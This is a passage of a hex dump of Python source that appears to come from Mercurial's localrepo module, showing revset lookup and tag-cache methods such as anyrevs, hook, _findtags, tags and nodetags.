+00011850: 696c 2e72 6576 7261 6e67 6528 2960 602e  il.revrange()``.
+00011860: 0a20 2020 2020 2020 2022 2222 0a20 2020  .        """.   
+00011870: 2020 2020 2066 6f72 2072 2069 6e20 7365       for r in se
+00011880: 6c66 2e72 6576 7328 6578 7072 2c20 2a61  lf.revs(expr, *a
+00011890: 7267 7329 3a0a 2020 2020 2020 2020 2020  rgs):.          
+000118a0: 2020 7969 656c 6420 7365 6c66 5b72 5d0a    yield self[r].
+000118b0: 0a20 2020 2064 6566 2061 6e79 7265 7673  .    def anyrevs
+000118c0: 2873 656c 662c 2073 7065 6373 3a20 6279  (self, specs: by
+000118d0: 7465 732c 2075 7365 723d 4661 6c73 652c  tes, user=False,
+000118e0: 206c 6f63 616c 616c 6961 733d 4e6f 6e65   localalias=None
+000118f0: 293a 0a20 2020 2020 2020 2022 2222 4669  ):.        """Fi
+00011900: 6e64 2072 6576 6973 696f 6e73 206d 6174  nd revisions mat
+00011910: 6368 696e 6720 6f6e 6520 6f66 2074 6865  ching one of the
+00011920: 2067 6976 656e 2072 6576 7365 7473 2e0a   given revsets..
+00011930: 0a20 2020 2020 2020 2052 6576 7365 7420  .        Revset 
+00011940: 616c 6961 7365 7320 6672 6f6d 2074 6865  aliases from the
+00011950: 2063 6f6e 6669 6775 7261 7469 6f6e 2061   configuration a
+00011960: 7265 206e 6f74 2065 7870 616e 6465 6420  re not expanded 
+00011970: 6279 2064 6566 6175 6c74 2e20 546f 0a20  by default. To. 
+00011980: 2020 2020 2020 2065 7870 616e 6420 7573         expand us
+00011990: 6572 2061 6c69 6173 6573 2c20 7370 6563  er aliases, spec
+000119a0: 6966 7920 6060 7573 6572 3d54 7275 6560  ify ``user=True`
+000119b0: 602e 2054 6f20 7072 6f76 6964 6520 736f  `. To provide so
+000119c0: 6d65 206c 6f63 616c 0a20 2020 2020 2020  me local.       
+000119d0: 2064 6566 696e 6974 696f 6e73 206f 7665   definitions ove
+000119e0: 7272 6964 696e 6720 7573 6572 2061 6c69  rriding user ali
+000119f0: 6173 6573 2c20 7365 7420 6060 6c6f 6361  ases, set ``loca
+00011a00: 6c61 6c69 6173 6060 2074 6f0a 2020 2020  lalias`` to.    
+00011a10: 2020 2020 6060 7b6e 616d 653a 2064 6566      ``{name: def
+00011a20: 696e 6974 696f 6e73 7472 696e 677d 6060  initionstring}``
+00011a30: 2e0a 2020 2020 2020 2020 2222 220a 2020  ..        """.  
+00011a40: 2020 2020 2020 6966 2073 7065 6373 203d        if specs =
+00011a50: 3d20 5b62 276e 756c 6c27 5d3a 0a20 2020  = [b'null']:.   
+00011a60: 2020 2020 2020 2020 2072 6574 7572 6e20           return 
+00011a70: 7265 7673 6574 2e62 6173 6573 6574 285b  revset.baseset([
+00011a80: 6e75 6c6c 7265 765d 290a 2020 2020 2020  nullrev]).      
+00011a90: 2020 6966 2073 7065 6373 203d 3d20 5b62    if specs == [b
+00011aa0: 272e 275d 3a0a 2020 2020 2020 2020 2020  '.']:.          
+00011ab0: 2020 7175 6963 6b5f 6461 7461 203d 2073    quick_data = s
+00011ac0: 656c 662e 5f71 7569 636b 5f61 6363 6573  elf._quick_acces
+00011ad0: 735f 6368 616e 6765 6964 2e67 6574 2862  s_changeid.get(b
+00011ae0: 272e 2729 0a20 2020 2020 2020 2020 2020  '.').           
+00011af0: 2069 6620 7175 6963 6b5f 6461 7461 2069   if quick_data i
+00011b00: 7320 6e6f 7420 4e6f 6e65 3a0a 2020 2020  s not None:.    
+00011b10: 2020 2020 2020 2020 2020 2020 7265 7475              retu
+00011b20: 726e 2072 6576 7365 742e 6261 7365 7365  rn revset.basese
+00011b30: 7428 5b71 7569 636b 5f64 6174 615b 305d  t([quick_data[0]
+00011b40: 5d29 0a20 2020 2020 2020 2069 6620 7573  ]).        if us
+00011b50: 6572 3a0a 2020 2020 2020 2020 2020 2020  er:.            
+00011b60: 6d20 3d20 7265 7673 6574 2e6d 6174 6368  m = revset.match
+00011b70: 616e 7928 0a20 2020 2020 2020 2020 2020  any(.           
+00011b80: 2020 2020 2073 656c 662e 7569 2c0a 2020       self.ui,.  
+00011b90: 2020 2020 2020 2020 2020 2020 2020 7370                sp
+00011ba0: 6563 732c 0a20 2020 2020 2020 2020 2020  ecs,.           
+00011bb0: 2020 2020 206c 6f6f 6b75 703d 7265 7673       lookup=revs
+00011bc0: 6574 2e6c 6f6f 6b75 7066 6e28 7365 6c66  et.lookupfn(self
+00011bd0: 292c 0a20 2020 2020 2020 2020 2020 2020  ),.             
+00011be0: 2020 206c 6f63 616c 616c 6961 733d 6c6f     localalias=lo
+00011bf0: 6361 6c61 6c69 6173 2c0a 2020 2020 2020  calalias,.      
+00011c00: 2020 2020 2020 290a 2020 2020 2020 2020        ).        
+00011c10: 656c 7365 3a0a 2020 2020 2020 2020 2020  else:.          
+00011c20: 2020 6d20 3d20 7265 7673 6574 2e6d 6174    m = revset.mat
+00011c30: 6368 616e 7928 4e6f 6e65 2c20 7370 6563  chany(None, spec
+00011c40: 732c 206c 6f63 616c 616c 6961 733d 6c6f  s, localalias=lo
+00011c50: 6361 6c61 6c69 6173 290a 2020 2020 2020  calalias).      
+00011c60: 2020 7265 7475 726e 206d 2873 656c 6629    return m(self)
+00011c70: 0a0a 2020 2020 6465 6620 7572 6c28 7365  ..    def url(se
+00011c80: 6c66 2920 2d3e 2062 7974 6573 3a0a 2020  lf) -> bytes:.  
+00011c90: 2020 2020 2020 7265 7475 726e 2062 2766        return b'f
+00011ca0: 696c 653a 2720 2b20 7365 6c66 2e72 6f6f  ile:' + self.roo
+00011cb0: 740a 0a20 2020 2064 6566 2068 6f6f 6b28  t..    def hook(
+00011cc0: 7365 6c66 2c20 6e61 6d65 2c20 7468 726f  self, name, thro
+00011cd0: 773d 4661 6c73 652c 202a 2a61 7267 7329  w=False, **args)
+00011ce0: 3a0a 2020 2020 2020 2020 2222 2243 616c  :.        """Cal
+00011cf0: 6c20 6120 686f 6f6b 2c20 7061 7373 696e  l a hook, passin
+00011d00: 6720 7468 6973 2072 6570 6f20 696e 7374  g this repo inst
+00011d10: 616e 6365 2e0a 0a20 2020 2020 2020 2054  ance...        T
+00011d20: 6869 7320 6120 636f 6e76 656e 6965 6e63  his a convenienc
+00011d30: 6520 6d65 7468 6f64 2074 6f20 6169 6420  e method to aid 
+00011d40: 696e 766f 6b69 6e67 2068 6f6f 6b73 2e20  invoking hooks. 
+00011d50: 4578 7465 6e73 696f 6e73 206c 696b 656c  Extensions likel
+00011d60: 790a 2020 2020 2020 2020 776f 6e27 7420  y.        won't 
+00011d70: 6361 6c6c 2074 6869 7320 756e 6c65 7373  call this unless
+00011d80: 2074 6865 7920 6861 7665 2072 6567 6973   they have regis
+00011d90: 7465 7265 6420 6120 6375 7374 6f6d 2068  tered a custom h
+00011da0: 6f6f 6b20 6f72 2061 7265 0a20 2020 2020  ook or are.     
+00011db0: 2020 2072 6570 6c61 6369 6e67 2063 6f64     replacing cod
+00011dc0: 6520 7468 6174 2069 7320 6578 7065 6374  e that is expect
+00011dd0: 6564 2074 6f20 6361 6c6c 2061 2068 6f6f  ed to call a hoo
+00011de0: 6b2e 0a20 2020 2020 2020 2022 2222 0a20  k..        """. 
+00011df0: 2020 2020 2020 2072 6574 7572 6e20 686f         return ho
+00011e00: 6f6b 2e68 6f6f 6b28 7365 6c66 2e75 692c  ok.hook(self.ui,
+00011e10: 2073 656c 662c 206e 616d 652c 2074 6872   self, name, thr
+00011e20: 6f77 2c20 2a2a 6172 6773 290a 0a20 2020  ow, **args)..   
+00011e30: 2040 6669 6c74 6572 6564 7072 6f70 6572   @filteredproper
+00011e40: 7479 6361 6368 650a 2020 2020 6465 6620  tycache.    def 
+00011e50: 5f74 6167 7363 6163 6865 2873 656c 6629  _tagscache(self)
+00011e60: 3a0a 2020 2020 2020 2020 2222 2252 6574  :.        """Ret
+00011e70: 7572 6e73 2061 2074 6167 7363 6163 6865  urns a tagscache
+00011e80: 206f 626a 6563 7420 7468 6174 2063 6f6e   object that con
+00011e90: 7461 696e 7320 7661 7269 6f75 7320 7461  tains various ta
+00011ea0: 6773 2072 656c 6174 6564 0a20 2020 2020  gs related.     
+00011eb0: 2020 2063 6163 6865 732e 2222 220a 0a20     caches.""".. 
+00011ec0: 2020 2020 2020 2023 2054 6869 7320 7369         # This si
+00011ed0: 6d70 6c69 6669 6573 2069 7473 2063 6163  mplifies its cac
+00011ee0: 6865 206d 616e 6167 656d 656e 7420 6279  he management by
+00011ef0: 2068 6176 696e 6720 6f6e 6520 6465 636f   having one deco
+00011f00: 7261 7465 640a 2020 2020 2020 2020 2320  rated.        # 
+00011f10: 6675 6e63 7469 6f6e 2028 7468 6973 206f  function (this o
+00011f20: 6e65 2920 616e 6420 7468 6520 7265 7374  ne) and the rest
+00011f30: 2073 696d 706c 7920 6665 7463 6820 7468   simply fetch th
+00011f40: 696e 6773 2066 726f 6d20 6974 2e0a 2020  ings from it..  
+00011f50: 2020 2020 2020 636c 6173 7320 7461 6773        class tags
+00011f60: 6361 6368 653a 0a20 2020 2020 2020 2020  cache:.         
+00011f70: 2020 2064 6566 205f 5f69 6e69 745f 5f28     def __init__(
+00011f80: 7365 6c66 293a 0a20 2020 2020 2020 2020  self):.         
+00011f90: 2020 2020 2020 2023 2054 6865 7365 2074         # These t
+00011fa0: 776f 2064 6566 696e 6520 7468 6520 7365  wo define the se
+00011fb0: 7420 6f66 2074 6167 7320 666f 7220 7468  t of tags for th
+00011fc0: 6973 2072 6570 6f73 6974 6f72 792e 2074  is repository. t
+00011fd0: 6167 730a 2020 2020 2020 2020 2020 2020  ags.            
+00011fe0: 2020 2020 2320 6d61 7073 2074 6167 206e      # maps tag n
+00011ff0: 616d 6520 746f 206e 6f64 653b 2074 6167  ame to node; tag
+00012000: 7479 7065 7320 6d61 7073 2074 6167 206e  types maps tag n
+00012010: 616d 6520 746f 2027 676c 6f62 616c 2720  ame to 'global' 
+00012020: 6f72 0a20 2020 2020 2020 2020 2020 2020  or.             
+00012030: 2020 2023 2027 6c6f 6361 6c27 2e20 2847     # 'local'. (G
+00012040: 6c6f 6261 6c20 7461 6773 2061 7265 2064  lobal tags are d
+00012050: 6566 696e 6564 2062 7920 2e68 6774 6167  efined by .hgtag
+00012060: 7320 6163 726f 7373 2061 6c6c 0a20 2020  s across all.   
+00012070: 2020 2020 2020 2020 2020 2020 2023 2068               # h
+00012080: 6561 6473 2c20 616e 6420 6c6f 6361 6c20  eads, and local 
+00012090: 7461 6773 2061 7265 2064 6566 696e 6564  tags are defined
+000120a0: 2069 6e20 2e68 672f 6c6f 6361 6c74 6167   in .hg/localtag
+000120b0: 732e 290a 2020 2020 2020 2020 2020 2020  s.).            
+000120c0: 2020 2020 2320 5468 6579 2063 6f6e 7374      # They const
+000120d0: 6974 7574 6520 7468 6520 696e 2d6d 656d  itute the in-mem
+000120e0: 6f72 7920 6361 6368 6520 6f66 2074 6167  ory cache of tag
+000120f0: 732e 0a20 2020 2020 2020 2020 2020 2020  s..             
+00012100: 2020 2073 656c 662e 7461 6773 203d 2073     self.tags = s
+00012110: 656c 662e 7461 6774 7970 6573 203d 204e  elf.tagtypes = N
+00012120: 6f6e 650a 0a20 2020 2020 2020 2020 2020  one..           
+00012130: 2020 2020 2073 656c 662e 6e6f 6465 7461       self.nodeta
+00012140: 6773 6361 6368 6520 3d20 7365 6c66 2e74  gscache = self.t
+00012150: 6167 736c 6973 7420 3d20 4e6f 6e65 0a0a  agslist = None..
+00012160: 2020 2020 2020 2020 6361 6368 6520 3d20          cache = 
+00012170: 7461 6773 6361 6368 6528 290a 2020 2020  tagscache().    
+00012180: 2020 2020 6361 6368 652e 7461 6773 2c20      cache.tags, 
+00012190: 6361 6368 652e 7461 6774 7970 6573 203d  cache.tagtypes =
+000121a0: 2073 656c 662e 5f66 696e 6474 6167 7328   self._findtags(
+000121b0: 290a 0a20 2020 2020 2020 2072 6574 7572  )..        retur
+000121c0: 6e20 6361 6368 650a 0a20 2020 2064 6566  n cache..    def
+000121d0: 2074 6167 7328 7365 6c66 293a 0a20 2020   tags(self):.   
+000121e0: 2020 2020 2027 2727 7265 7475 726e 2061       '''return a
+000121f0: 206d 6170 7069 6e67 206f 6620 7461 6720   mapping of tag 
+00012200: 746f 206e 6f64 6527 2727 0a20 2020 2020  to node'''.     
+00012210: 2020 2074 203d 207b 7d0a 2020 2020 2020     t = {}.      
+00012220: 2020 6966 2073 656c 662e 6368 616e 6765    if self.change
+00012230: 6c6f 672e 6669 6c74 6572 6564 7265 7673  log.filteredrevs
+00012240: 3a0a 2020 2020 2020 2020 2020 2020 7461  :.            ta
+00012250: 6773 2c20 7474 203d 2073 656c 662e 5f66  gs, tt = self._f
+00012260: 696e 6474 6167 7328 290a 2020 2020 2020  indtags().      
+00012270: 2020 656c 7365 3a0a 2020 2020 2020 2020    else:.        
+00012280: 2020 2020 7461 6773 203d 2073 656c 662e      tags = self.
+00012290: 5f74 6167 7363 6163 6865 2e74 6167 730a  _tagscache.tags.
+000122a0: 2020 2020 2020 2020 7265 7620 3d20 7365          rev = se
+000122b0: 6c66 2e63 6861 6e67 656c 6f67 2e72 6576  lf.changelog.rev
+000122c0: 0a20 2020 2020 2020 2066 6f72 206b 2c20  .        for k, 
+000122d0: 7620 696e 2074 6167 732e 6974 656d 7328  v in tags.items(
+000122e0: 293a 0a20 2020 2020 2020 2020 2020 2074  ):.            t
+000122f0: 7279 3a0a 2020 2020 2020 2020 2020 2020  ry:.            
+00012300: 2020 2020 2320 6967 6e6f 7265 2074 6167      # ignore tag
+00012310: 7320 746f 2075 6e6b 6e6f 776e 206e 6f64  s to unknown nod
+00012320: 6573 0a20 2020 2020 2020 2020 2020 2020  es.             
+00012330: 2020 2072 6576 2876 290a 2020 2020 2020     rev(v).      
+00012340: 2020 2020 2020 2020 2020 745b 6b5d 203d            t[k] =
+00012350: 2076 0a20 2020 2020 2020 2020 2020 2065   v.            e
+00012360: 7863 6570 7420 2865 7272 6f72 2e4c 6f6f  xcept (error.Loo
+00012370: 6b75 7045 7272 6f72 2c20 5661 6c75 6545  kupError, ValueE
+00012380: 7272 6f72 293a 0a20 2020 2020 2020 2020  rror):.         
+00012390: 2020 2020 2020 2070 6173 730a 2020 2020         pass.    
+000123a0: 2020 2020 7265 7475 726e 2074 0a0a 2020      return t..  
+000123b0: 2020 6465 6620 5f66 696e 6474 6167 7328    def _findtags(
+000123c0: 7365 6c66 293a 0a20 2020 2020 2020 2022  self):.        "
+000123d0: 2222 446f 2074 6865 2068 6172 6420 776f  ""Do the hard wo
+000123e0: 726b 206f 6620 6669 6e64 696e 6720 7461  rk of finding ta
+000123f0: 6773 2e20 2052 6574 7572 6e20 6120 7061  gs.  Return a pa
+00012400: 6972 206f 6620 6469 6374 730a 2020 2020  ir of dicts.    
+00012410: 2020 2020 2874 6167 732c 2074 6167 7479      (tags, tagty
+00012420: 7065 7329 2077 6865 7265 2074 6167 7320  pes) where tags 
+00012430: 6d61 7073 2074 6167 206e 616d 6520 746f  maps tag name to
+00012440: 206e 6f64 652c 2061 6e64 2074 6167 7479   node, and tagty
+00012450: 7065 730a 2020 2020 2020 2020 6d61 7073  pes.        maps
+00012460: 2074 6167 206e 616d 6520 746f 2061 2073   tag name to a s
+00012470: 7472 696e 6720 6c69 6b65 205c 2767 6c6f  tring like \'glo
+00012480: 6261 6c5c 2720 6f72 205c 276c 6f63 616c  bal\' or \'local
+00012490: 5c27 2e0a 2020 2020 2020 2020 5375 6263  \'..        Subc
+000124a0: 6c61 7373 6573 206f 7220 6578 7465 6e73  lasses or extens
+000124b0: 696f 6e73 2061 7265 2066 7265 6520 746f  ions are free to
+000124c0: 2061 6464 2074 6865 6972 206f 776e 2074   add their own t
+000124d0: 6167 732c 2062 7574 0a20 2020 2020 2020  ags, but.       
+000124e0: 2073 686f 756c 6420 6265 2061 7761 7265   should be aware
+000124f0: 2074 6861 7420 7468 6520 7265 7475 726e   that the return
+00012500: 6564 2064 6963 7473 2077 696c 6c20 6265  ed dicts will be
+00012510: 2072 6574 6169 6e65 6420 666f 7220 7468   retained for th
+00012520: 650a 2020 2020 2020 2020 6475 7261 7469  e.        durati
+00012530: 6f6e 206f 6620 7468 6520 6c6f 6361 6c72  on of the localr
+00012540: 6570 6f20 6f62 6a65 6374 2e22 2222 0a0a  epo object."""..
+00012550: 2020 2020 2020 2020 2320 5858 5820 7768          # XXX wh
+00012560: 6174 2074 6167 7479 7065 2073 686f 756c  at tagtype shoul
+00012570: 6420 7375 6263 6c61 7373 6573 2f65 7874  d subclasses/ext
+00012580: 656e 7369 6f6e 7320 7573 653f 2020 4375  ensions use?  Cu
+00012590: 7272 656e 746c 790a 2020 2020 2020 2020  rrently.        
+000125a0: 2320 6d71 2061 6e64 2062 6f6f 6b6d 6172  # mq and bookmar
+000125b0: 6b73 2061 6464 2074 6167 732c 2062 7574  ks add tags, but
+000125c0: 2064 6f20 6e6f 7420 7365 7420 7468 6520   do not set the 
+000125d0: 7461 6774 7970 6520 6174 2061 6c6c 2e0a  tagtype at all..
+000125e0: 2020 2020 2020 2020 2320 5368 6f75 6c64          # Should
+000125f0: 2065 6163 6820 6578 7465 6e73 696f 6e20   each extension 
+00012600: 696e 7665 6e74 2069 7473 206f 776e 2074  invent its own t
+00012610: 6167 2074 7970 653f 2020 5368 6f75 6c64  ag type?  Should
+00012620: 2074 6865 7265 0a20 2020 2020 2020 2023   there.        #
+00012630: 2062 6520 6f6e 6520 7461 6774 7970 6520   be one tagtype 
+00012640: 666f 7220 616c 6c20 7375 6368 2022 7669  for all such "vi
+00012650: 7274 7561 6c22 2074 6167 733f 2020 4f72  rtual" tags?  Or
+00012660: 2069 7320 7468 6520 7374 6174 7573 0a20   is the status. 
+00012670: 2020 2020 2020 2023 2071 756f 2066 696e         # quo fin
+00012680: 653f 0a0a 2020 2020 2020 2020 2320 6d61  e?..        # ma
+00012690: 7020 7461 6720 6e61 6d65 2074 6f20 286e  p tag name to (n
+000126a0: 6f64 652c 2068 6973 7429 0a20 2020 2020  ode, hist).     
+000126b0: 2020 2061 6c6c 7461 6773 203d 2074 6167     alltags = tag
+000126c0: 736d 6f64 2e66 696e 6467 6c6f 6261 6c74  smod.findglobalt
+000126d0: 6167 7328 7365 6c66 2e75 692c 2073 656c  ags(self.ui, sel
+000126e0: 6629 0a20 2020 2020 2020 2023 206d 6170  f).        # map
+000126f0: 2074 6167 206e 616d 6520 746f 2074 6167   tag name to tag
+00012700: 2074 7970 650a 2020 2020 2020 2020 7461   type.        ta
+00012710: 6774 7970 6573 203d 207b 7461 673a 2062  gtypes = {tag: b
+00012720: 2767 6c6f 6261 6c27 2066 6f72 2074 6167  'global' for tag
+00012730: 2069 6e20 616c 6c74 6167 737d 0a0a 2020   in alltags}..  
+00012740: 2020 2020 2020 7461 6773 6d6f 642e 7265        tagsmod.re
+00012750: 6164 6c6f 6361 6c74 6167 7328 7365 6c66  adlocaltags(self
+00012760: 2e75 692c 2073 656c 662c 2061 6c6c 7461  .ui, self, allta
+00012770: 6773 2c20 7461 6774 7970 6573 290a 0a20  gs, tagtypes).. 
+00012780: 2020 2020 2020 2023 2042 7569 6c64 2074         # Build t
+00012790: 6865 2072 6574 7572 6e20 6469 6374 732e  he return dicts.
+000127a0: 2020 4861 7665 2074 6f20 7265 2d65 6e63    Have to re-enc
+000127b0: 6f64 6520 7461 6720 6e61 6d65 7320 6265  ode tag names be
+000127c0: 6361 7573 650a 2020 2020 2020 2020 2320  cause.        # 
+000127d0: 7468 6520 7461 6773 206d 6f64 756c 6520  the tags module 
+000127e0: 616c 7761 7973 2075 7365 7320 5554 462d  always uses UTF-
+000127f0: 3820 2869 6e20 6f72 6465 7220 6e6f 7420  8 (in order not 
+00012800: 746f 206c 6f73 6520 696e 666f 0a20 2020  to lose info.   
+00012810: 2020 2020 2023 2077 7269 7469 6e67 2074       # writing t
+00012820: 6f20 7468 6520 6361 6368 6529 2c20 6275  o the cache), bu
+00012830: 7420 7468 6520 7265 7374 206f 6620 4d65  t the rest of Me
+00012840: 7263 7572 6961 6c20 7761 6e74 7320 7468  rcurial wants th
+00012850: 656d 2069 6e0a 2020 2020 2020 2020 2320  em in.        # 
+00012860: 6c6f 6361 6c20 656e 636f 6469 6e67 2e0a  local encoding..
+00012870: 2020 2020 2020 2020 7461 6773 203d 207b          tags = {
+00012880: 7d0a 2020 2020 2020 2020 666f 7220 6e61  }.        for na
+00012890: 6d65 2c20 286e 6f64 652c 2068 6973 7429  me, (node, hist)
+000128a0: 2069 6e20 616c 6c74 6167 732e 6974 656d   in alltags.item
+000128b0: 7328 293a 0a20 2020 2020 2020 2020 2020  s():.           
+000128c0: 2069 6620 6e6f 6465 2021 3d20 7365 6c66   if node != self
+000128d0: 2e6e 756c 6c69 643a 0a20 2020 2020 2020  .nullid:.       
+000128e0: 2020 2020 2020 2020 2074 6167 735b 656e           tags[en
+000128f0: 636f 6469 6e67 2e74 6f6c 6f63 616c 286e  coding.tolocal(n
+00012900: 616d 6529 5d20 3d20 6e6f 6465 0a20 2020  ame)] = node.   
+00012910: 2020 2020 2074 6167 735b 6227 7469 7027       tags[b'tip'
+00012920: 5d20 3d20 7365 6c66 2e63 6861 6e67 656c  ] = self.changel
+00012930: 6f67 2e74 6970 2829 0a20 2020 2020 2020  og.tip().       
+00012940: 2074 6167 7479 7065 7320 3d20 7b0a 2020   tagtypes = {.  
+00012950: 2020 2020 2020 2020 2020 656e 636f 6469            encodi
+00012960: 6e67 2e74 6f6c 6f63 616c 286e 616d 6529  ng.tolocal(name)
+00012970: 3a20 7661 6c75 6520 666f 7220 286e 616d  : value for (nam
+00012980: 652c 2076 616c 7565 2920 696e 2074 6167  e, value) in tag
+00012990: 7479 7065 732e 6974 656d 7328 290a 2020  types.items().  
+000129a0: 2020 2020 2020 7d0a 2020 2020 2020 2020        }.        
+000129b0: 7265 7475 726e 2028 7461 6773 2c20 7461  return (tags, ta
+000129c0: 6774 7970 6573 290a 0a20 2020 2064 6566  gtypes)..    def
+000129d0: 2074 6167 7479 7065 2873 656c 662c 2074   tagtype(self, t
+000129e0: 6167 6e61 6d65 293a 0a20 2020 2020 2020  agname):.       
+000129f0: 2022 2222 0a20 2020 2020 2020 2072 6574   """.        ret
+00012a00: 7572 6e20 7468 6520 7479 7065 206f 6620  urn the type of 
+00012a10: 7468 6520 6769 7665 6e20 7461 672e 2072  the given tag. r
+00012a20: 6573 756c 7420 6361 6e20 6265 3a0a 0a20  esult can be:.. 
+00012a30: 2020 2020 2020 2027 6c6f 6361 6c27 2020         'local'  
+00012a40: 3a20 6120 6c6f 6361 6c20 7461 670a 2020  : a local tag.  
+00012a50: 2020 2020 2020 2767 6c6f 6261 6c27 203a        'global' :
+00012a60: 2061 2067 6c6f 6261 6c20 7461 670a 2020   a global tag.  
+00012a70: 2020 2020 2020 4e6f 6e65 2020 2020 203a        None     :
+00012a80: 2074 6167 2064 6f65 7320 6e6f 7420 6578   tag does not ex
+00012a90: 6973 740a 2020 2020 2020 2020 2222 220a  ist.        """.
+00012aa0: 0a20 2020 2020 2020 2072 6574 7572 6e20  .        return 
+00012ab0: 7365 6c66 2e5f 7461 6773 6361 6368 652e  self._tagscache.
+00012ac0: 7461 6774 7970 6573 2e67 6574 2874 6167  tagtypes.get(tag
+00012ad0: 6e61 6d65 290a 0a20 2020 2064 6566 2074  name)..    def t
+00012ae0: 6167 736c 6973 7428 7365 6c66 293a 0a20  agslist(self):. 
+00012af0: 2020 2020 2020 2027 2727 7265 7475 726e         '''return
+00012b00: 2061 206c 6973 7420 6f66 2074 6167 7320   a list of tags 
+00012b10: 6f72 6465 7265 6420 6279 2072 6576 6973  ordered by revis
+00012b20: 696f 6e27 2727 0a20 2020 2020 2020 2069  ion'''.        i
+00012b30: 6620 6e6f 7420 7365 6c66 2e5f 7461 6773  f not self._tags
+00012b40: 6361 6368 652e 7461 6773 6c69 7374 3a0a  cache.tagslist:.
+00012b50: 2020 2020 2020 2020 2020 2020 6c20 3d20              l = 
+00012b60: 5b5d 0a20 2020 2020 2020 2020 2020 2066  [].            f
+00012b70: 6f72 2074 2c20 6e20 696e 2073 656c 662e  or t, n in self.
+00012b80: 7461 6773 2829 2e69 7465 6d73 2829 3a0a  tags().items():.
+00012b90: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00012ba0: 6c2e 6170 7065 6e64 2828 7365 6c66 2e63  l.append((self.c
+00012bb0: 6861 6e67 656c 6f67 2e72 6576 286e 292c  hangelog.rev(n),
+00012bc0: 2074 2c20 6e29 290a 2020 2020 2020 2020   t, n)).        
+00012bd0: 2020 2020 7365 6c66 2e5f 7461 6773 6361      self._tagsca
+00012be0: 6368 652e 7461 6773 6c69 7374 203d 205b  che.tagslist = [
+00012bf0: 2874 2c20 6e29 2066 6f72 2072 2c20 742c  (t, n) for r, t,
+00012c00: 206e 2069 6e20 736f 7274 6564 286c 295d   n in sorted(l)]
+00012c10: 0a0a 2020 2020 2020 2020 7265 7475 726e  ..        return
+00012c20: 2073 656c 662e 5f74 6167 7363 6163 6865   self._tagscache
+00012c30: 2e74 6167 736c 6973 740a 0a20 2020 2064  .tagslist..    d
+00012c40: 6566 206e 6f64 6574 6167 7328 7365 6c66  ef nodetags(self
+00012c50: 2c20 6e6f 6465 293a 0a20 2020 2020 2020  , node):.       
+00012c60: 2027 2727 7265 7475 726e 2074 6865 2074   '''return the t
+00012c70: 6167 7320 6173 736f 6369 6174 6564 2077  ags associated w
+00012c80: 6974 6820 6120 6e6f 6465 2727 270a 2020  ith a node'''.  
+00012c90: 2020 2020 2020 6966 206e 6f74 2073 656c        if not sel
+00012ca0: 662e 5f74 6167 7363 6163 6865 2e6e 6f64  f._tagscache.nod
+00012cb0: 6574 6167 7363 6163 6865 3a0a 2020 2020  etagscache:.    
+00012cc0: 2020 2020 2020 2020 6e6f 6465 7461 6773          nodetags
+00012cd0: 6361 6368 6520 3d20 7b7d 0a20 2020 2020  cache = {}.     
+00012ce0: 2020 2020 2020 2066 6f72 2074 2c20 6e20         for t, n 
+00012cf0: 696e 2073 656c 662e 5f74 6167 7363 6163  in self._tagscac
+00012d00: 6865 2e74 6167 732e 6974 656d 7328 293a  he.tags.items():
+00012d10: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00012d20: 206e 6f64 6574 6167 7363 6163 6865 2e73   nodetagscache.s
+00012d30: 6574 6465 6661 756c 7428 6e2c 205b 5d29  etdefault(n, [])
+00012d40: 2e61 7070 656e 6428 7429 0a20 2020 2020  .append(t).     
+00012d50: 2020 2020 2020 2066 6f72 2074 6167 7320         for tags 
+00012d60: 696e 206e 6f64 6574 6167 7363 6163 6865  in nodetagscache
+00012d70: 2e76 616c 7565 7328 293a 0a20 2020 2020  .values():.     
+00012d80: 2020 2020 2020 2020 2020 2074 6167 732e             tags.
+00012d90: 736f 7274 2829 0a20 2020 2020 2020 2020  sort().         
+00012da0: 2020 2073 656c 662e 5f74 6167 7363 6163     self._tagscac
+00012db0: 6865 2e6e 6f64 6574 6167 7363 6163 6865  he.nodetagscache
+00012dc0: 203d 206e 6f64 6574 6167 7363 6163 6865   = nodetagscache
+00012dd0: 0a20 2020 2020 2020 2072 6574 7572 6e20  .        return 
+00012de0: 7365 6c66 2e5f 7461 6773 6361 6368 652e  self._tagscache.
+00012df0: 6e6f 6465 7461 6773 6361 6368 652e 6765  nodetagscache.ge
+00012e00: 7428 6e6f 6465 2c20 5b5d 290a 0a20 2020  t(node, [])..   
+00012e10: 2064 6566 206e 6f64 6562 6f6f 6b6d 6172   def nodebookmar
+00012e20: 6b73 2873 656c 662c 206e 6f64 6529 3a0a  ks(self, node):.
+00012e30: 2020 2020 2020 2020 2222 2272 6574 7572          """retur
+00012e40: 6e20 7468 6520 6c69 7374 206f 6620 626f  n the list of bo
+00012e50: 6f6b 6d61 726b 7320 706f 696e 7469 6e67  okmarks pointing
+00012e60: 2074 6f20 7468 6520 7370 6563 6966 6965   to the specifie
+00012e70: 6420 6e6f 6465 2222 220a 2020 2020 2020  d node""".      
+00012e80: 2020 7265 7475 726e 2073 656c 662e 5f62    return self._b
+00012e90: 6f6f 6b6d 6172 6b73 2e6e 616d 6573 286e  ookmarks.names(n
+00012ea0: 6f64 6529 0a0a 2020 2020 6465 6620 6272  ode)..    def br
+00012eb0: 616e 6368 6d61 7028 7365 6c66 293a 0a20  anchmap(self):. 
+00012ec0: 2020 2020 2020 2022 2222 7265 7475 726e         """return
+00012ed0: 7320 6120 6469 6374 696f 6e61 7279 207b  s a dictionary {
+00012ee0: 6272 616e 6368 3a20 5b62 7261 6e63 6868  branch: [branchh
+00012ef0: 6561 6473 5d7d 2077 6974 6820 6272 616e  eads]} with bran
+00012f00: 6368 6865 6164 730a 2020 2020 2020 2020  chheads.        
+00012f10: 6f72 6465 7265 6420 6279 2069 6e63 7265  ordered by incre
+00012f20: 6173 696e 6720 7265 7669 7369 6f6e 206e  asing revision n
+00012f30: 756d 6265 7222 2222 0a20 2020 2020 2020  umber""".       
+00012f40: 2072 6574 7572 6e20 7365 6c66 2e5f 6272   return self._br
+00012f50: 616e 6368 6361 6368 6573 5b73 656c 665d  anchcaches[self]
+00012f60: 0a0a 2020 2020 4075 6e66 696c 7465 7265  ..    @unfiltere
+00012f70: 646d 6574 686f 640a 2020 2020 6465 6620  dmethod.    def 
+00012f80: 7265 7662 7261 6e63 6863 6163 6865 2873  revbranchcache(s
+00012f90: 656c 6629 3a0a 2020 2020 2020 2020 6966  elf):.        if
+00012fa0: 206e 6f74 2073 656c 662e 5f72 6576 6272   not self._revbr
+00012fb0: 616e 6368 6361 6368 653a 0a20 2020 2020  anchcache:.     
